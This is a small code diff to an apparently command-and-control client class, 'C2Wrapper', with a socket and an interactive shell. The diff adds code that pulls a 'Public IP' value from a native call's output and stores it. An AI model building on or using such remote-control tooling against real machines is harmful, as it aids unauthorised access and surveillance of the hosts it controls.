@@ -19,6 +19,9 @@ class C2Wrapper:
         
         # Socket file descriptor
         self.client_fd: Optional[int] = None
+
+        # ipv4 for later use
+        self.ipv4 = None
     
     def _setup_function_signatures(self):
         """Configure ctypes function signatures"""
@@ -93,6 +96,10 @@ class C2Wrapper:
         # Convert C string to Python string
         result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
         self._free_cstring(ptr)
+        # Get ipv4
+        for line in result.splitlines():
+            if line.startswith("Public IP"):
+                self.ipv4 = line.split(":", 1)[1].strip()
         return result
     
     def interactive_shell(self):
